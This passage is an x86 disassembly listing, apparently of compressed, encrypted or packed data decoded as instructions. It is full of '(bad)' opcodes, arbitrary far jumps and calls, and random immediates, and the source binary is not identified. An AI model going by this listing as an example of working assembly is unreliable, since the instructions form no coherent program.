  41a983:	(bad)  
  41a984:	and    al,BYTE PTR [ecx-0x48]
  41a987:	pop    edx
  41a988:	xchg   edi,esi
  41a98a:	(bad)  
  41a98b:	in     al,dx
  41a98c:	xchg   edi,eax
  41a98d:	data16 and BYTE PTR [esi+0x59],al
  41a991:	push   DWORD PTR [edi-0x4794e077]
  41a997:	or     al,0xaa
  41a999:	imul   ecx,DWORD PTR [eax],0x1b92a075
  41a99f:	sahf   
  41a9a0:	ret    0x8a34
  41a9a3:	jnp    0x41a9c2
  41a9a5:	or     al,0xa7
  41a9a7:	icebp  
  41a9a8:	mov    eax,ds:0x1c0ec703
  41a9ad:	es lods al,BYTE PTR cs:[esi]
  41a9b0:	into   
  41a9b1:	aad    0x9c
  41a9b3:	xlat   BYTE PTR ds:[ebx]
  41a9b4:	push   ebx
  41a9b5:	jmp    0xdcb1:0xcbffcea5
  41a9bc:	lea    ebp,[edx+ebp*4+0x6ba379aa]
  41a9c3:	call   0x768d7601
  41a9c8:	dec    edi
  41a9c9:	jae    0x41a9ca
  41a9cb:	adc    BYTE PTR [ebx-0x53],dl
  41a9ce:	xchg   edi,eax
  41a9cf:	(bad)  
  41a9d0:	inc    edx
  41a9d1:	adc    BYTE PTR [edx+0x56],dh
  41a9d4:	pop    ebx
  41a9d5:	scas   al,BYTE PTR es:[edi]
  41a9d6:	jle    0x41aa09
  41a9d8:	adc    BYTE PTR [ebx+esi*4],dh
  41a9db:	xchg   DWORD PTR [esi-0x35],eax
  41a9de:	mov    dl,bl
  41a9e0:	in     al,dx
  41a9e1:	shr    BYTE PTR [edx+esi*1-0x582ccaed],cl
  41a9e8:	loope  0x41aa4e
  41a9ea:	mov    ecx,DWORD PTR [edi-0xaa87b15]
  41a9f0:	je     0x41aa6e
  41a9f2:	xchg   esi,eax
  41a9f3:	(bad)  
  41a9f4:	sbb    al,0x2a
  41a9f6:	jae    0x41aa28
  41a9f8:	stos   BYTE PTR es:[edi],al
  41a9f9:	icebp  
  41a9fa:	fwait
  41a9fb:	int    0x44
  41a9fd:	ins    DWORD PTR es:[edi],dx
  41a9fe:	pop    edi
  41a9ff:	add    al,0x2
  41aa01:	mov    dh,bl
  41aa03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa04:	fwait
  41aa05:	sahf   
  41aa06:	push   edx
  41aa07:	fidiv  DWORD PTR [ebp+0x7fa86b7a]
  41aa0d:	add    BYTE PTR [ecx+0x6f],dh
  41aa10:	sub    BYTE PTR [edx+eiz*4],0x1
  41aa14:	or     eax,ebx
  41aa16:	jl     0x41a9b4
  41aa18:	xchg   ebp,eax
  41aa19:	lods   al,BYTE PTR ds:[esi]
  41aa1a:	inc    ebp
  41aa1b:	xchg   DWORD PTR [edi],edx
  41aa1d:	mov    bh,0xd2
  41aa1f:	add    eax,0x97071945
  41aa24:	push   0x5a
  41aa26:	lahf   
  41aa27:	jmp    0xdd8fdb5
  41aa2c:	push   ebp
  41aa2d:	test   DWORD PTR [eax+0x79],esp
  41aa30:	out    dx,al
  41aa31:	data16 cli 
  41aa33:	inc    ebx
  41aa34:	push   0x2
  41aa36:	test   ebp,edx
  41aa38:	mov    eax,ds:0x6dfa0b1b
  41aa3d:	pop    es
  41aa3e:	inc    ebp
  41aa3f:	inc    edx
  41aa40:	jg     0x41aa5e
  41aa42:	(bad)  [ecx-0x3fdafa8d]
  41aa48:	jne    0x41a9ff
  41aa4a:	inc    ebp
  41aa4b:	jp     0x41aaaa
  41aa4d:	cld    
  41aa4e:	xchg   edi,eax
  41aa4f:	retf   0x5dab
  41aa52:	fadd   DWORD PTR [ebp+edi*2+0x48636528]
  41aa59:	popf   
  41aa5a:	push   ss
  41aa5b:	imul   ebp,DWORD PTR [eax-0x33],0x7e64d047
  41aa62:	xor    al,0x97
  41aa64:	sahf   
  41aa65:	add    esp,esp
  41aa67:	gs rcl eax,0x4e
  41aa6b:	loope  0x41aa51
  41aa6d:	cmp    ch,cl
  41aa6f:	or     eax,0x91454cb3
  41aa74:	lock mov esp,0xfa5b4a1d
  41aa7a:	add    al,al
  41aa7c:	or     DWORD PTR [eax-0x2e],0x78
  41aa80:	pop    ecx
  41aa81:	(bad)  
  41aa82:	sub    DWORD PTR [ebx-0x3d],0xfffffff8
  41aa86:	and    al,0xa4
  41aa88:	push   edi
  41aa89:	lea    ecx,[ecx-0x30]
  41aa8c:	xor    al,0x83
  41aa8e:	jecxz  0x41aac8
  41aa90:	jecxz  0x41aa35
  41aa92:	and    al,BYTE PTR [eax+eax*1-0xe6f282f]
  41aa99:	or     BYTE PTR [esi+0x16],al
  41aa9c:	sub    edx,DWORD PTR [eax-0x54]
  41aa9f:	int    0x5f
  41aaa1:	nop
  41aaa2:	out    0xd1,eax
  41aaa4:	mov    ds:0x7252e99b,eax
  41aaa9:	test   al,0xf6
  41aaab:	(bad)  
  41aaac:	jnp    0x41aa5e
  41aaae:	inc    esi
  41aaaf:	jb     0x41aa3a
  41aab1:	jmp    0x435be825
  41aab6:	mov    ecx,0xf444c9ec
  41aabb:	xor    BYTE PTR [eax],bh
  41aabd:	shl    ebp,1
  41aabf:	test   ebx,esi
  41aac1:	jbe    0x41aab7
  41aac3:	fsubr  QWORD PTR [esi]
  41aac5:	iret   
  41aac6:	(bad)  
  41aac9:	or     eax,0xc20a93ea
  41aace:	pop    ecx
  41aacf:	xchg   ebx,eax
  41aad0:	push   0x74980ab4
  41aad5:	repnz push esp
  41aad7:	cmp    cl,BYTE PTR [esi-0x6a]
  41aada:	dec    esp
  41aadb:	mov    ah,0x29
  41aadd:	imul   edx,DWORD PTR [ebx+0x6a],0xe33d4fc6
  41aae4:	xchg   ecx,eax
  41aae5:	mov    ch,0x96
  41aae7:	jg     0x41aa78
  41aae9:	bound  edi,QWORD PTR [edx-0x710fb6e8]
  41aaef:	into   
  41aaf0:	fstp   DWORD PTR [eax-0x4e705ad9]
  41aaf6:	fdiv   DWORD PTR [edi+eax*4]
  41aaf9:	jne    0x41aaf9
  41aafb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aafc:	leave  
  41aafd:	cmp    BYTE PTR [ebx+0x479f51b1],dh
  41ab03:	jp     0x41ab06
  41ab05:	ds cli 
  41ab07:	cmp    ebp,ecx
  41ab09:	push   cs
  41ab0a:	hlt    
  41ab0b:	pop    ebx
  41ab0c:	mov    ah,BYTE PTR [esi]
  41ab0e:	mov    ah,0x97
  41ab10:	and    eax,0xb6e69274
  41ab15:	adc    ah,al
  41ab17:	loop   0x41ab89
  41ab19:	inc    eax
  41ab1a:	push   ecx
  41ab1b:	rcl    DWORD PTR [ecx+esi*2-0x46c0523],cl
  41ab22:	cld    
  41ab23:	and    BYTE PTR [ebp+0x1fd68f10],0xa3
  41ab2a:	pop    ss
  41ab2b:	xchg   ebp,eax
  41ab2c:	and    BYTE PTR [ebx-0x58],ch
  41ab2f:	pop    esp
  41ab30:	outs   dx,DWORD PTR ds:[esi]
  41ab31:	pop    ss
  41ab32:	bound  esp,QWORD PTR [edi]
  41ab34:	imul   edi,DWORD PTR [edx-0x10d6289f],0x7d6d36ed
  41ab3e:	call   0x2e90:0x19fdabc1
  41ab45:	mov    ah,0x18
  41ab47:	sar    ebx,cl
  41ab49:	sub    al,BYTE PTR [esi+0x23]
  41ab4c:	popf   
  41ab4d:	retf   0x1545
  41ab50:	mov    ecx,0x267827d5
  41ab55:	adc    eax,0xb270483
  41ab5a:	jg     0x41abba
  41ab5c:	ds int 0x3
  41ab5f:	xchg   ecx,eax
  41ab60:	call   0xd73410f
  41ab65:	bound  eax,QWORD PTR [edx+ebp*8]
  41ab68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab69:	cmc    
  41ab6a:	aad    0x88
  41ab6c:	cmp    esp,DWORD PTR ds:0x93fd43b3
  41ab72:	test   al,0xc5
  41ab74:	inc    ebp
  41ab75:	push   0xda7f5419
  41ab7a:	dec    edx
  41ab7b:	je     0x41abab
  41ab7d:	pop    ss
  41ab7e:	div    bh
  41ab80:	lahf   
  41ab81:	int3   
  41ab82:	add    dl,BYTE PTR [eax+edi*8-0x13]
  41ab86:	fidivr WORD PTR [eax]
  41ab88:	call   0xfa615fd9
  41ab8d:	mov    edx,esp
  41ab8f:	(bad)  
  41ab90:	retf   
  41ab91:	push   eax
  41ab92:	inc    edx
  41ab93:	stc    
  41ab94:	jns    0x41ab9e
  41ab96:	in     al,0x5c
  41ab98:	lods   eax,DWORD PTR ds:[esi]
  41ab99:	js     0x41ac0f
  41ab9b:	gs mov ebp,0x1c9278d8
  41aba1:	lods   al,BYTE PTR ds:[esi]
  41aba2:	ins    BYTE PTR es:[edi],dx
  41aba3:	retf   0xfa00
  41aba6:	mov    ebp,0x587803e8
  41abab:	popf   
  41abac:	and    DWORD PTR [edi-0x77],edx
  41abaf:	sti    
  41abb0:	pop    es
  41abb1:	iret   
  41abb2:	fdiv   QWORD PTR [esi-0x68cccd69]
  41abb8:	fmul   QWORD PTR [edx]
  41abba:	dec    ebx
  41abbb:	pop    edi
  41abbc:	mov    dh,0xb4
  41abbe:	cmp    ebp,DWORD PTR [edx+0x57]
  41abc1:	xor    esp,DWORD PTR [ebx+0x39dddb93]
  41abc7:	mov    esp,0x78701320
  41abcc:	push   ebp
  41abcd:	nop
  41abce:	js     0x41aba6
  41abd0:	(bad)  ss:[esi+0x76]
  41abd4:	cld    
  41abd5:	mov    WORD PTR es:[ebp+0x53a7ba74],fs
  41abdc:	push   esp
  41abdd:	jae    0x41ac3e
  41abdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abe0:	adc    BYTE PTR [ecx-0x4b],ah
  41abe3:	mov    ds:0x2b05f294,eax
  41abe8:	leave  
  41abe9:	mov    edx,0x2f00b0cb
  41abee:	cdq    
  41abef:	jb     0x41ab9f
  41abf1:	outs   dx,BYTE PTR ds:[si]
  41abf3:	push   eax
  41abf4:	scas   al,BYTE PTR es:[edi]
  41abf5:	jnp    0x41ac19
  41abf7:	xor    al,0x2a
  41abf9:	pop    es
  41abfa:	dec    edx
  41abfb:	imul   bl
  41abfd:	js     0x41abd9
  41abff:	ja     0x41ab88
  41ac01:	xchg   ebp,eax
  41ac02:	mov    ah,dh
  41ac04:	daa    
  41ac05:	push   0xffffffa8
  41ac07:	jp     0x41ac67
  41ac09:	xchg   ebx,ebx
  41ac0b:	call   0xdb2f:0x39796599
  41ac12:	pushf  
  41ac13:	mov    edx,0xc8e66db6
  41ac18:	and    al,0x86
  41ac1a:	sbb    al,0x89
  41ac1c:	mov    edi,fs
  41ac1e:	lods   al,BYTE PTR ds:[esi]
  41ac1f:	xchg   edi,eax
  41ac20:	inc    edx
  41ac21:	and    al,0xe
  41ac23:	jle    0x41ac27
  41ac25:	data16 ficom DWORD PTR [edx-0x67]
  41ac29:	mov    WORD PTR [ebp+0x31],gs
  41ac2c:	and    BYTE PTR [esi+0x10],dh
  41ac2f:	cmp    ecx,DWORD PTR [edx+0x63d17dcc]
  41ac35:	popf   
  41ac36:	mov    esi,0x4370c610
  41ac3b:	mov    ch,BYTE PTR ds:0x4e137f07
  41ac41:	stos   DWORD PTR es:[edi],eax
  41ac42:	sbb    al,0xcf
  41ac44:	cmp    BYTE PTR [edi-0xc156648],0x22
  41ac4b:	(bad)  
  41ac4c:	icebp  
  41ac4d:	pusha  
  41ac4e:	ret    
  41ac4f:	push   cs
  41ac50:	fst    DWORD PTR [edx]
  41ac52:	loopne 0x41ac95
  41ac54:	pusha  
  41ac55:	push   cs
  41ac56:	jbe    0x41aca7
  41ac58:	mov    eax,ds:0x30d2f144
  41ac5d:	loop   0x41acd9
  41ac5f:	add    cl,bl
  41ac61:	mov    ebx,DWORD PTR [edx]
  41ac63:	ins    DWORD PTR es:[edi],dx
  41ac64:	mov    edi,0x46b4b4c9
  41ac69:	out    dx,al
  41ac6a:	pushf  
  41ac6b:	jo     0x41acb2
  41ac6d:	jno    0x41ac77
  41ac6f:	fimul  WORD PTR [esi-0x201bd547]
  41ac75:	add    eax,0x5c2c8ecb
  41ac7a:	sbb    DWORD PTR [edx],0x28
  41ac7d:	sbb    dh,BYTE PTR [edi]
  41ac7f:	cs pop edi
  41ac81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac82:	xor    bl,BYTE PTR [ebp+ebx*8-0x73]
  41ac86:	sub    DWORD PTR [eax],ebx
  41ac88:	into   
  41ac89:	(bad)  
  41ac8a:	mov    dh,0xa5
  41ac8c:	jo     0x41ad04
  41ac8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac8f:	sbb    esp,DWORD PTR [edi-0x1d6fcc39]
  41ac95:	pop    ss
  41ac96:	pop    edx
	...
  41ad13:	add    BYTE PTR [ebx+0x42],dl
  41ad16:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  41ad1d:	pop    eax
  41ad1e:	cdq    
  41ad1f:	rol    DWORD PTR [esi+0x1ef8998e],0x4c
  41ad26:	add    DWORD PTR [eax],eax
  41ad28:	imul   eax,DWORD PTR [edi],0x0
  41ad2b:	add    BYTE PTR [edx],al
  41ad2d:	pop    ecx
  41ad2e:	jge    0x41ad00
  41ad30:	push   es
  41ad31:	gs pop es
  41ad33:	or     DWORD PTR [edi],0xffffffa4
  41ad36:	push   ecx
  41ad37:	fxch   st(2)
  41ad39:	jecxz  0x41ada5
  41ad3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad3c:	push   0xdc2a054a
  41ad41:	lods   al,BYTE PTR ds:[esi]
  41ad42:	pushf  
  41ad43:	lds    esp,FWORD PTR [ecx-0x6ad856b3]
  41ad49:	mov    ecx,0x1d147013
  41ad4e:	and    al,0x5f
  41ad50:	or     eax,0xe5ae7638
  41ad55:	repnz mov ecx,0xf9d6d67a
  41ad5b:	cmp    al,0x23
  41ad5d:	repz lea edi,[ebp+edi*8+0x363d1f22]
  41ad65:	sbb    DWORD PTR [edi+0x44],ebp
  41ad68:	loopne 0x41ad8c
  41ad6a:	sbb    BYTE PTR [ebx+ebx*1+0x8bbc0cc],cl
  41ad71:	or     ecx,edx
  41ad73:	(bad)  
  41ad74:	ror    DWORD PTR [edx-0x7da6abaf],cl
  41ad7a:	push   ss
  41ad7b:	fmul   DWORD PTR [eax+0x27]
  41ad7e:	xor    esi,ecx
  41ad80:	adc    BYTE PTR [edi+0x61],0xae
  41ad84:	cli    
  41ad85:	xchg   esp,eax
  41ad86:	(bad)  
  41ad87:	xlat   BYTE PTR ds:[ebx]
  41ad88:	mov    ch,0x19
  41ad8a:	pusha  
  41ad8b:	pop    ss
  41ad8c:	sahf   
  41ad8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad8e:	repz jmp 0x9ccd:0x9eab4835
  41ad96:	sbb    dl,BYTE PTR [edi+eax*2-0x3c52c84d]
  41ad9d:	(bad)  
  41ad9f:	jb     0x41ae18
  41ada1:	iret   
  41ada2:	jbe    0x41ad58
  41ada4:	or     al,0x63
  41ada6:	das    
  41ada7:	adc    eax,0x2ebbb680
  41adac:	sub    DWORD PTR [esi-0x2d],esp
  41adaf:	inc    esi
  41adb0:	call   0x908d:0x755d4077
  41adb7:	mov    eax,ds:0x4c5cc2ea
  41adbc:	ret    
  41adbd:	or     DWORD PTR [ebp-0x8],0xfffffff9
  41adc1:	mov    ebp,0xa19bab88
  41adc6:	stos   BYTE PTR es:[edi],al
  41adc7:	inc    esi
  41adc8:	test   al,0x67
  41adca:	add    esi,eax
  41adcc:	push   0x75
  41adce:	pushf  
  41adcf:	popf   
  41add0:	adc    al,0xed
  41add2:	mov    edx,0xfd28d002
  41add7:	mov    dh,0x97
  41add9:	call   0x3c41991a
  41adde:	and    al,0x34
  41ade0:	mov    al,ds:0xc6459010
  41ade5:	mov    dl,0xe
  41ade7:	push   0x3d05bbf7
  41adec:	inc    ebx
  41aded:	mov    eax,ds:0xb1eb96d9
  41adf2:	(bad)  
  41adf3:	in     eax,dx
  41adf4:	inc    ebx
  41adf5:	pop    edx
  41adf6:	popa   
  41adf7:	ror    ah,cl
  41adf9:	sbb    dh,ah
  41adfb:	push   ebx
  41adfc:	jmp    0x41ae04
  41adfe:	in     eax,dx
  41adff:	xor    eax,0x5548ac66
  41ae04:	test   BYTE PTR [esi+edx*8+0x5d903353],ch
  41ae0b:	cmc    
  41ae0c:	or     eax,0x18506fa3
  41ae11:	pop    ds
  41ae12:	xchg   edi,eax
  41ae13:	in     eax,dx
  41ae14:	ret    0xd2fd
  41ae17:	lock pop es
  41ae19:	repz scas al,BYTE PTR es:[edi]
  41ae1b:	rol    BYTE PTR [ecx-0x1f],cl
  41ae1e:	add    DWORD PTR [esi+0x2591c8a5],ebx
  41ae24:	(bad)  
  41ae25:	je     0x41ae21
  41ae27:	mov    edx,0xe1fd112
  41ae2c:	cli    
  41ae2d:	scas   eax,DWORD PTR es:[edi]
  41ae2e:	jb     0x41ae3e
  41ae30:	adc    dh,BYTE PTR [ebx+eiz*8-0x65]
  41ae34:	pop    eax
  41ae35:	jnp    0x41adc1
  41ae37:	sub    BYTE PTR [esi+0x65a5539f],bl
  41ae3d:	jge    0x41aeb0
  41ae3f:	sbb    DWORD PTR [ecx],eax
  41ae41:	aas    
  41ae42:	add    ch,BYTE PTR [ebx]
  41ae44:	sbb    esp,DWORD PTR [ebx+ebx*1-0x10291581]
  41ae4b:	mov    eax,ds:0x1b63832e
  41ae50:	xchg   ebx,eax
  41ae51:	in     al,0x32
  41ae53:	sti    
  41ae54:	ret    
  41ae55:	pop    ds
  41ae56:	test   BYTE PTR [esi+0x3731d722],bh
  41ae5c:	aas    
  41ae5d:	pop    esp
  41ae5e:	dec    edx
  41ae5f:	sar    ecx,1
  41ae61:	rol    DWORD PTR [ebx+ebp*2],0x3f
  41ae65:	dec    esi
  41ae66:	scas   eax,DWORD PTR es:[edi]
  41ae67:	add    BYTE PTR [eax+0x1a889c93],dh
  41ae6d:	jg     0x41ae22
  41ae6f:	push   ss
  41ae70:	cmp    ch,BYTE PTR [ebp-0x66]
  41ae73:	dec    eax
  41ae74:	(bad)  
  41ae75:	dec    edi
  41ae76:	and    esp,edi
  41ae78:	rcr    DWORD PTR ss:[ebp-0x23fc7b2b],0x6b
  41ae80:	pop    ebx
  41ae81:	xrelease mov DWORD PTR [ebp-0x12],edi
  41ae85:	lods   al,BYTE PTR ds:[esi]
  41ae86:	pop    edx
  41ae87:	loopne 0x41ae74
  41ae89:	fimul  WORD PTR [ecx+0x7c1058d5]
  41ae8f:	aam    0x82
  41ae91:	xchg   esi,eax
  41ae92:	sbb    BYTE PTR [ecx-0x29],dl
  41ae95:	test   al,0xb0
  41ae97:	inc    eax
  41ae98:	xlat   BYTE PTR ds:[ebx]
  41ae99:	adc    dl,BYTE PTR [edx]
  41ae9b:	xchg   edx,eax
  41ae9c:	inc    ebp
  41ae9d:	call   0x3c66c7f8
  41aea2:	push   ecx
  41aea3:	xor    al,0x49
  41aea5:	aad    0xd3
  41aea7:	imul   ebx,esi,0xffffffcd
  41aeaa:	mov    bh,BYTE PTR [eax]
  41aeac:	jne    0x41ae89
  41aeae:	cli    
  41aeaf:	jmp    0x174c9131
  41aeb4:	pop    ss
  41aeb5:	rcl    BYTE PTR [esi-0x79531f77],cl
  41aebb:	dec    esp
  41aebc:	dec    ecx
  41aebd:	data16 fucom st(5)
  41aec0:	push   esp
  41aec1:	mov    edi,0x9d96fbcf
  41aec7:	or     DWORD PTR [edi+0x16],0x1b
  41aecb:	out    0x88,eax
  41aecd:	dec    esi
  41aece:	ins    DWORD PTR es:[edi],dx
  41aecf:	call   0x6d31785c
  41aed4:	int    0x36
  41aed6:	mov    ah,0x36
  41aed8:	sbb    esp,ebp
  41aeda:	sub    eax,0xf290879e
  41aedf:	out    0x72,al
  41aee1:	jb     0x41aec6
  41aee3:	sbb    edx,DWORD PTR [edi-0x1d79d446]
  41aee9:	out    dx,al
  41aeea:	cmp    eax,eax
  41aeec:	daa    
  41aeed:	sahf   
  41aeee:	imul   esi,DWORD PTR [eax+eiz*2],0x88af3244
  41aef5:	ror    ecx,0xdd
  41aef8:	call   0x2f53:0xbb1aaea8
  41aeff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af00:	mov    WORD PTR [ecx+0x569d233e],?
  41af06:	bound  ecx,QWORD PTR [esi]
  41af08:	fnsave [ecx+0x16]
  41af0b:	jecxz  0x41af29
  41af0d:	mov    edx,0x4cc3d7ec
  41af12:	icebp  
  41af13:	jns    0x41aee2
  41af15:	fbld   TBYTE PTR [ecx+0x3d]
  41af18:	push   ss
  41af19:	fild   WORD PTR [edi+ebx*4]
  41af1c:	out    dx,eax
  41af1d:	jmp    0x2b82:0x1b9e9c23
  41af24:	sbb    eax,0xbb03d124
  41af29:	adc    BYTE PTR [eax],bl
  41af2b:	lahf   
  41af2c:	add    al,0xea
  41af2e:	xor    al,0x83
  41af30:	mov    dh,0x49
  41af32:	pop    esp
  41af33:	xchg   edi,eax
  41af34:	fstp   DWORD PTR [ecx+0xe083c02]
  41af3a:	push   ebx
  41af3b:	dec    edi
  41af3c:	jp     0x41af5a
  41af3e:	inc    eax
  41af3f:	ja     0x41aed1
  41af41:	dec    ecx
  41af42:	fist   WORD PTR [ecx+0x66]
  41af45:	pop    es
  41af46:	or     DWORD PTR [edx+0x30d343ac],edx
  41af4c:	fnsave [edi+eiz*1+0x1c4aa288]
  41af53:	outs   dx,BYTE PTR ds:[esi]
  41af54:	mov    cl,0xff
  41af56:	pop    ss
  41af57:	imul   DWORD PTR [eax+0x449e31e4]
  41af5d:	mov    eax,ds:0x69da5a2c
  41af62:	add    DWORD PTR [eax],esp
  41af64:	lahf   
  41af65:	pop    edi
  41af66:	or     eax,0x18d4bcc2
  41af6b:	sbb    bh,BYTE PTR [ecx+0x24]
  41af6e:	push   edi
  41af6f:	or     eax,0xefd60b85
  41af74:	fiadd  DWORD PTR [esi]
  41af76:	and    edi,DWORD PTR [esi+ebp*2]
  41af79:	mov    bl,0x44
  41af7b:	jns    0x41af4a
  41af7d:	icebp  
  41af7e:	xchg   ebp,eax
  41af7f:	pop    ds
  41af80:	and    ebx,esp
  41af82:	jge    0x41aff5
  41af84:	push   edi
  41af85:	das    
  41af86:	mov    cl,0x96
  41af88:	ds stos BYTE PTR es:[edi],al
  41af8a:	fimul  DWORD PTR [ebp*8+0x29bd952a]
  41af91:	xchg   DWORD PTR [edx+0x28cf302c],ebp
  41af97:	pop    ecx
  41af98:	retf   
  41af99:	arpl   WORD PTR [ebx+0x3d],di
  41af9c:	call   0x242bd917
  41afa1:	sub    esi,ebp
  41afa3:	mov    bl,0x7
  41afa5:	jmp    0x41afe9
  41afa7:	add    al,0x28
  41afa9:	mov    edx,0x887a804a
  41afae:	leave  
  41afaf:	das    
  41afb0:	repnz xor al,0x6c
  41afb3:	out    dx,eax
  41afb4:	aam    0x19
  41afb6:	cmp    cl,ch
  41afb8:	int    0x3
  41afba:	call   0x6e75d8b8
  41afbf:	out    dx,al
  41afc0:	xchg   ebx,eax
  41afc1:	cmc    
  41afc2:	push   ebp
  41afc3:	mov    edi,0xfb7517aa
  41afc8:	xchg   DWORD PTR [ebp-0x6094c05d],esi
  41afce:	bound  ebx,QWORD PTR [edi]
  41afd0:	rol    esp,cl
  41afd2:	popa   
  41afd3:	sub    al,0x8f
  41afd5:	popf   
  41afd6:	sahf   
  41afd7:	int3   
  41afd8:	jp     0x41af9d
  41afda:	test   al,0x18
  41afdc:	xchg   ebp,eax
  41afdd:	call   0xe29403ab
  41afe2:	pop    edx
  41afe3:	test   eax,0xfcf21675
  41afe8:	les    ebx,FWORD PTR [ebp+0x41]
  41afeb:	cli    
  41afec:	xlat   BYTE PTR ds:[ebx]
  41afed:	in     eax,dx
  41afee:	(bad)  
  41afef:	fs lock or bh,al
  41aff3:	es sub eax,0x72e8da7d
  41aff9:	ja     0x41afe2
  41affb:	mul    DWORD PTR [edx-0x66b641b4]
  41b001:	adc    al,0xea
  41b003:	ret    
  41b004:	popa   
  41b005:	addr16 mov ah,0x81
  41b008:	test   eax,0x989b0b3b
  41b00d:	call   0x75ae:0xe6f53b97
  41b014:	pushf  
  41b015:	jo     0x41b04f
  41b017:	jo     0x41b08a
  41b019:	mov    BYTE PTR [edx+0xaeea696],bh
  41b01f:	push   es
  41b020:	stos   DWORD PTR es:[edi],eax
  41b021:	cmp    ch,dl
  41b023:	jo     0x41b060
  41b025:	stos   BYTE PTR es:[edi],al
  41b026:	push   esi
  41b027:	out    dx,al
  41b028:	mov    al,ds:0x7201f65d
  41b02d:	daa    
  41b02e:	retf   0xc760
  41b031:	add    edi,ebx
  41b033:	je     0x41b082
  41b035:	neg    DWORD PTR [edi+0x1b]
  41b038:	mov    ds:0x67a84872,al
  41b03d:	fst    DWORD PTR [edx*8-0x2d7e1204]
  41b044:	jp     0x41b03f
  41b046:	pop    ss
  41b047:	push   ecx
  41b048:	clc    
  41b049:	icebp  
  41b04a:	dec    esi
  41b04b:	push   0xffffffb6
  41b04d:	xchg   ebp,eax
  41b04e:	sbb    al,BYTE PTR [ecx]
  41b050:	je     0x41b0aa
  41b052:	jmp    FWORD PTR [ebp-0x4d14e173]
  41b058:	(bad)  
  41b05a:	inc    ebx
  41b05b:	xor    DWORD PTR [edx],ebx
  41b05d:	loop   0x41aff8
  41b05f:	sbb    al,0xd4
  41b061:	adc    al,0x39
  41b063:	or     BYTE PTR [esi+ecx*2],dh
  41b066:	pop    ebp
  41b067:	dec    esi
  41b068:	push   cs
  41b069:	test   BYTE PTR [edx+0x26b7b694],ah
  41b06f:	mov    eax,edi
  41b071:	mov    edx,0x8d15004e
  41b076:	pop    ss
  41b077:	inc    edx
  41b078:	sub    eax,0xb2afcaa4
  41b07d:	jno    0x41b037
  41b07f:	xor    esp,DWORD PTR [esi+0x59167341]
  41b085:	mov    esp,0x3c016c8c
  41b08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b08b:	sub    eax,0xac439091
  41b090:	inc    esi
  41b091:	mov    ecx,edx
  41b093:	or     al,0x5f
  41b095:	mov    bl,0xb5
  41b097:	mov    al,0xb3
  41b099:	pusha  
  41b09a:	jo     0x41b04b
  41b09c:	and    ebx,DWORD PTR [ebx+0x3b]
  41b09f:	inc    ebx
  41b0a0:	adc    BYTE PTR [ebx-0x52],ch
  41b0a3:	sub    DWORD PTR [esi],ebp
  41b0a5:	adc    BYTE PTR [ebx],ah
  41b0a7:	pop    esp
  41b0a8:	pop    eax
  41b0a9:	adc    ecx,0xa20b7fbf
  41b0af:	enter  0x1dfd,0x2c
  41b0b3:	jno    0x41b048
  41b0b5:	outs   dx,BYTE PTR ds:[esi]
  41b0b6:	mov    bh,0xec
  41b0b8:	icebp  
  41b0b9:	shl    BYTE PTR [ebx],0xa0
  41b0bc:	or     al,0xd8
  41b0be:	xchg   esi,eax
  41b0bf:	shl    cl,1
  41b0c1:	inc    ebx
  41b0c2:	adc    ebp,0x8278a2a4
  41b0c8:	xchg   BYTE PTR [esi],bh
  41b0ca:	in     al,dx
  41b0cb:	outs   dx,BYTE PTR ds:[esi]
  41b0cc:	outs   dx,BYTE PTR ds:[esi]
  41b0cd:	and    ch,0x39
  41b0d0:	arpl   WORD PTR [esi-0x12],cx
  41b0d3:	mov    edx,DWORD PTR [edi+0x105f9546]
  41b0d9:	push   edi
  41b0da:	push   esi
  41b0db:	(bad)  
  41b0de:	retf   0xabcb
  41b0e1:	in     al,0xa6
  41b0e3:	inc    ecx
  41b0e4:	mov    BYTE PTR [ecx-0x33315913],ch
  41b0ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0eb:	add    DWORD PTR [esp],ecx
  41b0ee:	jg     0x41b0cf
  41b0f0:	out    0xd6,ax
  41b0f3:	push   edi
  41b0f4:	jnp    0x41b139
  41b0f6:	jmp    0x41b0c9
  41b0f8:	icebp  
  41b0f9:	dec    esp
  41b0fa:	fistp  DWORD PTR [edi+ebx*4+0x1d]
  41b0fe:	inc    ecx
  41b0ff:	mov    dl,0x4e
  41b101:	xchg   DWORD PTR [esi],edi
  41b103:	adc    bl,BYTE PTR [ebx]
  41b105:	pop    edx
  41b106:	xor    DWORD PTR [edx],0x74d1f1d
  41b10c:	les    esp,FWORD PTR [edx]
  41b10e:	mov    esi,0xe2b0411b
  41b113:	mov    cs,WORD PTR ds:0xc54d622f
  41b119:	mov    dh,0x85
  41b11b:	mov    ebx,0xba931b09
  41b120:	push   ds
  41b121:	loop   0x41b0aa
  41b123:	xor    al,0x7c
  41b125:	mov    cl,0x1
  41b127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b128:	adc    DWORD PTR [ecx+0x22],edx
  41b12b:	into   
  41b12c:	push   ebx
  41b12d:	cmp    bh,cl
  41b12f:	ins    BYTE PTR es:[edi],dx
  41b130:	push   ss
  41b131:	fld    TBYTE PTR [edi]
  41b133:	test   eax,0xd243d653
  41b138:	addr16 or ecx,edi
  41b13b:	ins    DWORD PTR es:[edi],dx
  41b13c:	jg     0x41b190
  41b13e:	add    al,0xa6
  41b140:	das    
  41b141:	push   esi
  41b142:	xchg   edx,eax
  41b143:	stos   BYTE PTR es:[edi],al
  41b144:	ss adc eax,0xfd7a93c0
  41b14a:	sbb    BYTE PTR [edi+0x7d02e4c],0xb0
  41b151:	lds    ebx,FWORD PTR [ecx+0x33ffca53]
  41b157:	cwde   
  41b158:	mov    al,0xb3
  41b15a:	push   0x564880cd
  41b15f:	pushf  
  41b160:	lods   al,BYTE PTR ds:[esi]
  41b161:	out    0xd9,eax
  41b163:	in     al,0xf8
  41b165:	enter  0xb10a,0xa2
